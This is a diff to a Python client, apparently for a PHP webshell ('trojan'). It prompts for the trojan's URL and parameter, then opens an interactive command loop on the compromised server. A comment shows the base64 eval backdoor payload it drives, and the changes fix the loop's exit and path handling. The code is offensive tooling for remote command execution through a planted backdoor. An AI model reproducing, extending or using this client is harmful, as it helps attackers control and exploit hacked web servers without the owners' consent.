@@ -12,14 +12,13 @@ def regularex(estring): #正则匹配
 	result = re.findall("(.*).*",estring)
 	return result
 def php_horse(url,parameter,header,pa=""):
-	print(pa)
 	if pa=="":
 		file_path=path(url,parameter,header)
 	else:
 		file_path=pa
 	cmd=str(input("\n["+str(file_path)+"]$ "))
 	if cmd == "":
-		return "None"
+		return pa
 	elif cmd =="exit":
 		return "exit"
 	#za=@eval(base64_decode($_POST[z0]));
@@ -40,8 +39,9 @@ url=str(input("木马url: "))
 parameter=str(input("木马参数: "))
 pa=php_horse(url,parameter,header) #pa为路径判断所需函数
 while True:
-	if pa!="":
-		pa=php_horse(url,parameter,header,pa=pa)
-	elif pa=="exit":
+	if pa=="exit":
 		break
+	elif pa!="":
+		pa=php_horse(url,parameter,header,pa=pa)
+
 
